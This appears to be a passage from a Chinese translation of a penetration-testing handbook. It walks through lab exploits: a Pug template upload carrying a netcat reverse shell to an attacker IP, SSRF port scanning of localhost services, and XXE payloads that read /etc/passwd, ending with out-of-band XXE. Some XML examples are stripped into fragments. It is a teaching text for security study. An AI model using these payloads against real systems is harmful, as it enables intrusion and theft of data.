上传下面的文本文件信息。在Pug中，“-”字符表示执行JavaScript。 
-var x = global.process.mainModule.require
-x('child_process').exec('nc [Your_IP] 8888 -e/bin/bash')
通过Burp工具，查看上传文件的请求和响应数据包，如图3.35所示。您将看到在POST请求响应数据包中，包含上传文件的散列值以及对动态路由的引用。
在此模板代码中，我们将require函数分配给child_process.exec，以便在操作系统级别上运行命令。Web服务器运行代码，回连到监听器IP地址和8888端口上，我们可以获得Web服务器Shell。
在攻击者计算机上，启动netcat监听器，准备Shell回连。 
nc -l -p 8888
图3.35
在端点上运行动态路由，从而激活代码。在浏览器中，找到上传的散列文件。动态路由端点采用指定的Pug模板进行呈现。幸运的是，我们上传的Pug模板包含反向Shell。 
在浏览器中访问drouting端点，使用从文件上传响应中恢复的文件。我们使用目录遍历“../”来降低一个目录，以便能够进入包含恶意文件的上传文件夹。
/drouting?filename=../uploads/[YOUR FILE HASH]
返回监听8888端口终端，使用Shell开始交互操作，如图3.36所示。
图3.36
3.3.14 服务器端请求伪造（SSRF）
服务器端请求伪造（SSRF）通常容易被误解，并且在表述方面，经常与跨站点请求伪造（CSRF）混为一谈。虽然这个漏洞已经存在了一段时间，但实际上大家对这个漏洞还不是很了解，特别是其带来的严重后果。我们来介绍一下SSRF是什么以及为什么会产生这个漏洞。
服务器端请求伪造通常用于访问本地系统、内部网络或某种迁移。现在通过一个简单的示例来理解 SSRF。假设有一个公共网站应用程序，允许用户通过互联网的网址上传配置文件图片。您登录该站点，访问个人配置，然后单击按钮，从 Imgur（公共图像托管服务）更新配置信息。您提供图像网址并单击提交。接下来发生的事情是服务器创建一个全新的请求，访问Imgur站点，抓取图像（可能会执行一些图像操作以调整图像大小—imagetragick），将其保存到服务器，并给用户发送成功消息。如您所见，我们提供了一个URL，服务器获取该URL并获得图像，然后将其上传到数据库。
我们最初向 Web 应用程序提供URL，以便从外部资源获取配置文件图片。但是，如果我们将图像网址指向http://127.0.0.1:80/favicon.ico，会发生什么？这将告诉服务器，不需要访问Imgur，仅需要从网站服务器的本地主机（自身）获取favicon.ico。如果我们能够获得200条消息或使个人资料图片来自于本地的图标，我们就会知道可能存在SSRF漏洞。
网站服务器运行在80端口，如果我们尝试连接到http://127.0.0.1:8080（这是一个除本地主机之外，其他主机无法访问的端口），会发生什么情况？这非常有趣。如果我们能得到完整的HTTP请求/响应数据包，而且可以在本地对端口8080发出GET请求，那么如果我们发现易受攻击的Jenkins或Apache Tomcat服务，会发生什么？即使这个端口没有对外公开，我们也许可以突破控制这个设备。如果我们开始请求内部地址http://192.168.10.2-254，而不是127.0.0.1会怎样？回想一下那些网站扫描工具，如果获得内部网络地址，那么扫描工具会重新发挥作用，可以用来发现内部网络服务的漏洞。
发现SSRF漏洞后，您可以做以下工作。
（1）在本地回环接口上访问服务。
（2）扫描内部网络并与这些服务进行交互（GET/POST/HEAD）。
（3）使用FILE://，读取服务器上的本地文件。
（4）利用AWS Rest接口。
（5）横向移动到内部环境中。
在图3.37中，我们在Web应用程序上发现了一个SSRF漏洞，综合利用该漏洞。
图3.37
让我们来看一个真实的例子。
在聊天支持系统（http://chat:3000/）网站应用程序中，首先确保创建一个账户并登录。
登录后，通过链接访问直接消息（DM）或直接访问http://chat:3000/directmessage。
在“Link”文本框中，输入http://cyberspacekittens.com网站，然后单击预览链接。
您现在应该看到http://cyberspacekittens.com呈现的页面，但URI栏仍应指向聊天应用程序。
这表明该站点容易存在SSRF漏洞。如图3.38所示，我们也可以尝试访问chat:3000/ ssrf?user=&comment=&link=http://127.0.0.1:3000并指向localhost。注意，页面表明我们现在访问服务器站点本地。
我们知道应用程序本身正在监听端口3000。我们可以使用Nmap工具从外部对设备进行扫描，并发现当前没有其他的Web端口开放，但是有什么服务仅可用于localhost开放呢？为了弄清楚，我们对127.0.0.1的所有端口进行暴力扫描。我们可以使用Burp Suite和Intruder工具完成这个任务。
图3.38
在Burp Suite中，单击“Proxy/HTTP History”选项卡，找到我们上一个SSRF的请求。
右键单击请求正文选择“Send to Intruder”。
❽Intruder”选项卡将变为可用，转到“位置”选项卡，然后单击“清除”。
单击并突出显示端口“3000”，然后单击Add。GET请求如下所示。 
GET/ssrf?user=&comment=&link=http://127.0.0.1:§3000§ HTTP/1.1
单击“Payloads”选项卡，然后选择静荷类型“Numbers”。如图3.39所示，选择端口28000～28100。通常选择所有端口，但是在本实验中仅选择一部分。 
From: 28000
To: 28100
Step: 1
单击“Start attack”按钮。
如图3.40所示，您将看到端口28017的响应长度远大于所有其他请求。如果打开浏览器访问网址：http://chat:3000/ssrf?user=&comment=&link=http://127.0.0.1:28017，就可以利用SSRF漏洞访问MongoDB网站界面，如图3.41所示。
图3.39
图3.40
图3.41
您应该能够访问所有链接，但需要借助 SSRF 漏洞。要访问 serverStatus（http://chat: 3000/serverStatus?text=1），如图3.42所示，您必须使用SSRF攻击方法并跳转到下面的网址。
图3.42
http://chat:3000/ssrf?user=&comment=&link=http://127.0.0.1:28017/serverStatus? text=1。
服务器端请求伪造漏洞的危害可能非常大。服务器端请求伪造漏洞不是新漏洞，目前发现的SSRF漏洞数量依然在不断增加。由于SSRF漏洞允许攻击者在基础网络内部进行迁移，因此通常会造成其他关键服务的暴露。
3.3.15 XML eXternal Entities（XXE）
XML 是可扩展标记语言的缩写，主要用于发送/存储易于理解的数据。XML eXternal Entities（XXE）是指应用程序中XML解析器漏洞。应用程序中的XML解析器具有允许文件上传、解析Office文档、JSON数据甚至Flash类型游戏等功能。当解析 XML 时，不正确的验证可能导致攻击者读取文件，发起拒绝服务攻击，甚至执行远程代码。从宏观角度来看，应用程序具有以下需求：（1）解析用户提供的XML数据；（2）实体的系统标识符部分必须在文档类型声明（DTD）内；（3）XML解析器必须验证/处理DTD并解析外部实体。正常XML和恶意XML的对比如表3.1所示。
表3.1
 正常XML文件
 恶意XML文件
   Book THP 100 
   ]> &xxe;
上面，我们有一个普通的XML文件和一个定制的读取系统的/etc/passwd内容的XML文件。我们来看一看，是否可以在真实的XML请求中注入恶意XML请求。
XXE实验
本实验需要自定义请求配置，有一个VMWare虚拟机可用于XXE攻击。
下载后，在VMWare中打开虚拟机并启动它。在登录界面中，您无须登录，但需要获取系统的IP地址。
设置浏览器。
通过Burp Suite代理所有流量。
访问网址：http://[虚拟机IP地址]。
拦截流量并单击“Hack the XML”。
在加载页面后，查看页面的HTML源代码，会有一个通过POST请求提交的隐藏字段。XML内容如下所示。
]>
Hack The &book;
在这个例子中，指定XML版本为1.0，DOCTYPE指定根元素是thp，!ELEMENT指定任何类型，并且!ENTITY设置book字符串“Universe”。最后，在XML输出中，我们希望从解析XML文件中打印出实体内容。
这通常是您在发送XML数据的应用程序中看到的内容。由于控制了POST数据中的XML请求数据，因此我们可以尝试注入恶意实体。默认情况下，绝大多数XML解析库都支持SYSTEM关键字，该关键字允许从URI读取数据（包括使用file://协议从系统本地读取数据）。因此，我们可以创建实体读取/etc/passwd文件。正常XML和恶意XML的对比如表3.2所示。
表3.2
 原始XML文件
 恶意XML文件
    ]> Hack The &book;
    ]> Hack The &book;
XXE实验——读取文件
拦截流量并在[IP of Your VM]/xxe.php中单击“Hack the XML”。
将截获的流量发送到Repeater。
修改POST参数中“data”内容。 
]>Hack The %26book%3B
请注意%26等同于&，%263B等同于；．我们需要对符号和分号字符进行百分比编码。
提交流量，我们能够读取/etc/passwd文件，如图3.43所示。
图3.43
3.3.16 高级XXE—带外（XXE-OOB）
在之前的攻击中，我们能够在标签中获得响应。如果看不到响应或遇到字符/文件限制，我们怎样把数据发送到带外（OOB）？我们可以提供远程文档类型定义（DTD）文件来执行OOB-XXE，而不是在请求静荷中定义攻击。DTD是具有完整结构的XML文件，它定义了XML文档的结构、合法元素及属性。为了方便起见，DTD 文件包含所需的攻击/渗透静荷，这将帮助我们解决许多字符限制的问题。在实验示例中，我们将使易受攻击的 XXE 服务器请求托管在远程服务器上的DTD文件。
新的XXE攻击将分以下4个阶段进行。
修改的XXE XML攻击。
使易受攻击的XML解析器从攻击者的服务器获取DTD文件。
DTD文件包含读取/etc/passwd文件的代码。
DTD文件包含用于泄露数据内容的代码（可能编码）。
设置攻击设备和XXE-OOB静荷。
我们将指定外部DTD文件，而不是原始文件读取。 
 %dtd;